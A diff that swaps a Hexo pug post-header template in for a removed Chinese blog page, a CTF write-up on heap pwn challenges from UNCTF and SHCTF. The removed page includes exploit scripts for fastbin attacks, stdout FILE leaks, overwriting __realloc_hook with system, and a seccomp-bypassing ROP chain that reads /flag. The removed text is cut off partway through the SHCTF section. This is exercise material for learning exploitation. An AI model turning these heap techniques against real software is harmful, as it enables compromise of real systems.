@@ -1,438 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>unctf和shctf的骚操作pwn - Watch Security</title>
-
-<meta name="keywords" content="Reverse, Security, New">
-
-<meta name="description " content="heap中的另类的骚操作">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-11-05">2019-11-05</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">unctf和shctf的骚操作pwn</h2>
-            <div class="post-meta">
-                本文总共8086个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="unctf和shctf的pwn题操作"><a href="#unctf和shctf的pwn题操作" class="headerlink" title="unctf和shctf的pwn题操作"></a>unctf和shctf的pwn题操作</h3><h4 id="0x01-闲说"><a href="#0x01-闲说" class="headerlink" title="0x01 闲说"></a>0x01 闲说</h4><ul>
-<li>最近的两次CTF，pwn题目很有意思（虽然很菜没做出来几个），觉得有必要记录下。</li>
-</ul>
-<h4 id="0x02-UNCTF"><a href="#0x02-UNCTF" class="headerlink" title="0x02 UNCTF"></a>0x02 UNCTF</h4><ul>
-<li><h5 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h5><ul>
-<li><p>程序分析</p>
-<ul>
-<li>典型的heap题目，提供了类似add, edit, delete的功能，但是没有show。<ul>
-<li>从这里也可以看出难点在于泄露地址。</li>
-</ul>
-</li>
-<li>chunk的size限制在fastbin里</li>
-</ul>
-<p><img src="unctf和shctf的骚操作pwn\3.png" alt=""></p>
-<ul>
-<li>存在数组下溢，和UAF漏洞</li>
-</ul>
-<p><img src="unctf和shctf的骚操作pwn\1.png" alt=""></p>
-<p>​    这里的溢出，导致可以修改chunk之外的地址</p>
-<p><img src="unctf和shctf的骚操作pwn\2.png" alt=""></p>
-<pre><code>UAF漏洞，这里组合一下可以Fastbin attack。
-</code></pre></li>
-<li><p>利用分析</p>
-<ul>
-<li><p>由于并不存在输出，一般是需要IO的，这里我用数组下溢的漏洞覆写stdout结构。泄露出_IO_file_jumps，得到libc地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak address stdout</span></span><br><span class="line">	edit(<span class="number">-12</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">  	data = p.recv(<span class="number">0x20</span>)</span><br><span class="line">  	leak = u64(data[<span class="number">0x18</span>:])                                 <span class="comment">#io_file jump</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>拿到libc后，就是怎么覆盖指针的问题了，这里用的是realloc，需要覆盖__realloc_hook。一开始我没想到UAF怎么利用，又重新打起了IO的主意，想要利用覆盖stdin达到任意地址写的目的。但是stdin在数组正向，下溢出达不到。</p>
-</li>
-<li><p>换了一个思路，发现realloc_hook在stdout下不远处，于是就想直接覆盖过去。结果，本地成功了，远程发现没能写进去，这是因为read的数目是不可控的，环境不同写入的长度不一样。</p>
-</li>
-<li><p>没办法，回到了UAF。才发现这个似乎简单些。只需要在realloc附低一些的位置找到合法的size，字节错位就可以修改fastbin的fd，实现分配。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fastbin attack, uaf</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64(realloc_hook<span class="number">-0xb</span><span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)		<span class="comment">#realloc</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">'a'</span>*<span class="number">0xb</span>+ p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>小结</p>
-<ul>
-<li>我这里应该是打了个非预期，看到大部分师傅是用的溢出。还有一个我不知道的知识点。就是realloc在size为0时，相当于free。然后利用unsorted bin打stdout。之后再free 和 realloc的类free打出double free的效果。</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><h5 id="orwheap"><a href="#orwheap" class="headerlink" title="orwheap"></a>orwheap</h5><ul>
-<li><p>程序分析</p>
-<ul>
-<li><p>这题目里有沙箱，用sec查出限制的规则，限制了只能是x64的，且ban了execve。</p>
-<p><img src="unctf和shctf的骚操作pwn\14.png" alt=""></p>
-</li>
-<li><p>只提供了add，delete，edit的功能</p>
-</li>
-<li><p>漏洞在add的时候输入内容，存在off-by-null。</p>
-<p><img src="![](unctf和shctf的骚操作pwn\15.png" alt=""></p>
-</li>
-</ul>
-</li>
-<li><p>利用分析</p>
-<ul>
-<li><p>之前见过sandbox这种，但是那时可以修改规则绕过，执行execve，但是这里似乎不存在。</p>
-</li>
-<li><p>查了一些博客和题目的提示”orwheap”，才知道是要想办法在栈上构造rop，open，read，write的方式。</p>
-</li>
-<li><p>首先泄露libc吧，这里利用off-by-null构造经典的overlapping，覆盖stdout。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="number">0x88</span>, <span class="string">'a'</span>*<span class="number">0x10</span>)			<span class="comment">#0</span></span><br><span class="line">	add(<span class="number">0x218</span>, <span class="string">'b'</span>*<span class="number">0x10</span>)		<span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x108</span>, <span class="string">'c'</span>*<span class="number">0x10</span>)		<span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0x80</span>, <span class="string">'d'</span>*<span class="number">0x10</span>)			<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#fake</span></span><br><span class="line">	edit(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0xf0</span> + p64(<span class="number">0x100</span>) + p64(<span class="number">0x101</span>))</span><br><span class="line">	<span class="comment">#into unsorted bin</span></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	<span class="comment">#null off by one</span></span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x88</span>, <span class="string">'a'</span>*<span class="number">0x88</span>)			<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#split from 1</span></span><br><span class="line">	add(<span class="number">0x88</span>, <span class="string">'b1'</span>)				<span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x68</span>, <span class="string">'b2'</span>)				<span class="comment">#4</span></span><br><span class="line">	add(<span class="number">0x88</span>, <span class="string">'b3'</span>)				<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">	free(<span class="number">1</span>)		</span><br><span class="line">	free(<span class="number">2</span>)						<span class="comment">#overlapping above b</span></span><br><span class="line"></span><br><span class="line">	free(<span class="number">4</span>)						<span class="comment">#into fastbin</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x88</span>, <span class="string">'over'</span>)			<span class="comment">#1	</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#overwrite fastbin'fd to stdout 错位即可拿到IO_stdout</span></span><br><span class="line">	add(<span class="number">0x290</span>, <span class="string">''</span>)				<span class="comment">#2</span></span><br><span class="line">	edit(<span class="number">2</span>, <span class="string">'\xdd\x45'</span>)			</span><br><span class="line"></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0x88</span>, <span class="string">'a'</span>*<span class="number">0x80</span> + p64(<span class="number">0x91</span>) + p64(<span class="number">0x71</span>))	<span class="comment">#1 modify size to 0x71 fastbin</span></span><br><span class="line"></span><br><span class="line">	free(<span class="number">5</span>)	</span><br><span class="line">	gdb.attach(p, <span class="string">'p puts'</span>)</span><br><span class="line">	dbg()					</span><br><span class="line">	add(<span class="number">0x68</span>, <span class="string">'padding'</span>)		<span class="comment">#4</span></span><br><span class="line">	add(<span class="number">0x68</span>, <span class="string">'stdout'</span>)			<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">	edit(<span class="number">5</span>, <span class="string">'a'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">	data = p.recv(<span class="number">0x90</span>)</span><br><span class="line">  	leak = u64(data[<span class="number">0x88</span>:])                                 <span class="comment">#io_file jump</span></span><br><span class="line">  	<span class="keyword">print</span> <span class="string">"leak ==&gt; "</span> + hex(leak)</span><br><span class="line"></span><br><span class="line">  	<span class="keyword">if</span> leak&amp;<span class="number">0x7f00000008e0</span> == <span class="number">0x7f00000008e0</span>:</span><br><span class="line"></span><br><span class="line">	  	libc_base = leak - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">	  	<span class="keyword">print</span> <span class="string">"libc_base ==&gt; "</span> + hex(libc_base)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>但是如何泄露stack和PIE的codebase呢？这里参考别的师傅的WP，用到了environ，通过stdout泄露environ下的内容可以泄露stack。。。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 	environ = libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line"> 	<span class="keyword">print</span> <span class="string">"environ ==&gt; "</span> + hex(environ)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(environ)+p64(environ+<span class="number">0x8</span>)+ p64(environ+<span class="number">0x8</span>))</span><br><span class="line"> 	leakstack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"> 	<span class="keyword">print</span> <span class="string">"leakstack ==&gt; "</span> + hex(leakstack)</span><br><span class="line"> 	codeptr = leakstack - <span class="number">0x30</span></span><br><span class="line"> 	<span class="keyword">print</span> <span class="string">"codeptr ==&gt; "</span> + hex(codeptr)</span><br><span class="line">      </span><br><span class="line"> 	edit(<span class="number">5</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(codeptr)+p64(codeptr+<span class="number">0x8</span>)+ p64(codeptr+<span class="number">0x8</span>))</span><br><span class="line"> 	codebase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x969</span></span><br><span class="line"> 	<span class="keyword">print</span> <span class="string">"codebase ==&gt; "</span> + hex(codebase)</span><br></pre></td></tr></table></figure>
-<p><img src="unctf和shctf的骚操作pwn\16.png" alt=""></p>
-</li>
-<li><p>然后就是在stack上找到合法的size，得到chunk，进行rop的布置。完成open，read，write的流程。这个合法的size最后在edit功能的read函数ret时的stack中找到的。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">fakechunk = leakstack - <span class="number">0x17b</span></span><br><span class="line">success(<span class="string">"fakechunk: "</span>+hex(fakechunk))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'0'</span>*<span class="number">0x88</span>+p64(<span class="number">0x71</span>)+<span class="string">'1'</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(fakechunk))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'5'</span>)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>之后就是rop的布置</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">prdiret = <span class="number">0x0000000000001193</span>+codebase</span><br><span class="line">prsiret = <span class="number">0x00000000000202e8</span>+libcbase</span><br><span class="line">prdxrsiret = <span class="number">0x00000000001150c9</span>+libcbase<span class="comment"># : pop rdx ; pop rsi ; ret</span></span><br><span class="line">leaveret = <span class="number">0x0000000000000b40</span>+codebase</span><br><span class="line">prbp = <span class="number">0x000000000001f930</span>+libcbase</span><br><span class="line">bss = codebase + <span class="number">0x202000</span></span><br><span class="line">openaddr = libcbase + libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">read = libcbase + libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">writeaddr = libcbase + libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">rop1 = p64(prbp)+p64(bss+<span class="number">0x200</span>)+p64(prsiret)+p64(bss+<span class="number">0x200</span>)+p64(read)+p64(leaveret)</span><br><span class="line"></span><br><span class="line">rop2 = p64(<span class="number">0</span>)+p64(prbp)+p64(bss+<span class="number">0x300</span>)+p64(prdiret)+p64(<span class="number">0</span>)+p64(prdxrsiret)+p64(<span class="number">0x200</span>)+p64(bss+<span class="number">0x300</span>)+p64(read)+p64(leaveret)</span><br><span class="line"></span><br><span class="line">rop3 = p64(<span class="number">0</span>)+p64(prdiret)+p64(codebase+<span class="number">0x202388</span>+<span class="number">8</span>)+p64(prsiret)+p64(<span class="number">0</span>)+p64(openaddr)+p64(prdiret)+p64(<span class="number">3</span>)+p64(prdxrsiret)+p64(<span class="number">0x40</span>)+p64(bss+<span class="number">0x500</span>)+p64(read)+p64(prdiret)+p64(<span class="number">1</span>)+p64(prdxrsiret)+p64(<span class="number">0x40</span>)+p64(bss+<span class="number">0x500</span>)+p64(writeaddr)+<span class="string">"/flag\x00"</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\x00'</span>*(<span class="number">0x2b</span>)+rop1)<span class="comment">#p64(0xdeadbeef))</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(rop2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(rop3)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>小结</p>
-<ul>
-<li>stack和heap的结合，绕过sandbox，很精彩。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="0x03-SHCTF"><a href="#0x03-SHCTF" class="headerlink" title="0x03 SHCTF"></a>0x03 SHCTF</h4><ul>
-<li><h5 id="Boringheap"><a href="#Boringheap" class="headerlink" title="Boringheap"></a>Boringheap</h5><ul>
-<li><p>程序分析</p>
-<ul>
-<li><p>size只提供三种选择0x20, 0x30, 0x40，对字节错位的利用有一定的干扰。</p>
-</li>
-<li><p>一开始真的没有找到问题在哪，后来注意到程序在求数组下标的时候多次用到<strong>abs</strong>函数求绝对值。在网上找到了一些有用的信息，这个函数有问题。（可以查阅abs的源码）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">abs</span>(<span class="number">0x80000000</span>) = <span class="number">0x80000000</span></span><br><span class="line">也就是说</span><br><span class="line"><span class="built_in">abs</span>(‭<span class="number">-2147483648</span>‬) = ‭<span class="number">-2147483648</span>‬</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>只是这样还不够，这个溢出的太多，无法利用，但是有了取余操作就OK了。</p>
-</li>
-<li><p>问题在类似edit的功能里，这里的下标没有检查是否合法，经过取余，我们可以修改当前chunk的header字段，和上一个chunk的内容。</p>
-<p><img src="unctf和shctf的骚操作pwn\4.png" alt=""></p>
-</li>
-</ul>
-</li>
-<li><p>利用分析</p>
-<ul>
-<li><p>提供了show功能，一般想办法利用unsorted bin泄露main_arena。</p>
-</li>
-<li><p>由于可以更改chunk的header，直接chunk overlapping进unsorted bin。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="string">'\x00'</span>)			<span class="comment">#0</span></span><br><span class="line">add(<span class="number">2</span>, <span class="string">'\x11'</span>)			<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="string">'\x22'</span>)			<span class="comment">#2</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#fake a chunk as unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">2</span>, payload)			<span class="comment">#3</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#fake big chunk</span></span><br><span class="line">add(<span class="number">3</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))	<span class="comment">#4</span></span><br><span class="line">add(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))	<span class="comment">#5</span></span><br><span class="line">add(<span class="number">3</span>, <span class="string">'\x66'</span>)				<span class="comment">#6</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#fake chunk1's size to 0x91, contain chunk2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x80000000</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>))		</span><br><span class="line">free(<span class="number">1</span>)			<span class="comment">#chunk1 ,2 into unsorted bin, while 2 also in chunk_ptr</span></span><br><span class="line">add(<span class="number">2</span>, <span class="string">'\x11'</span>)				<span class="comment">#7</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x58</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_arena ==&gt; "</span> + hex(main_arena)</span><br><span class="line">libc.address = main_arena - <span class="number">0x3c4b20</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>有了libc后，同样需要修改malloc_hook。这里由于size的限制没办法直接利用0x7f字节错位，所以需要在libc附近写入0x51这类的数。</p>
-</li>
-<li><p>首先，修改unsorted bin的size，再分配与之前类似的chunk，就可以拿到多个同样地址的chunk指针。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="string">'\x44'</span>)				<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x80000000</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xd1</span>))	<span class="comment">#modify unsorted bin's size , make a lat two pointer chunk</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"\xaa"</span>)				<span class="comment">#9</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">"\xaa"</span>)				<span class="comment">#10</span></span><br><span class="line">add(<span class="number">3</span>,<span class="string">"\x11"</span>)				<span class="comment">#11</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"\x23"</span>)				<span class="comment">#12</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"\x23"</span>)				<span class="comment">#13</span></span><br></pre></td></tr></table></figure>
-<p><img src="unctf和shctf的骚操作pwn\5.png" alt=""></p>
-</li>
-<li><p>释放重复的pointer中的一个，可以操作另一个修改fastbin的fd。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="unctf和shctf的骚操作pwn\6.png" alt=""></p>
-</li>
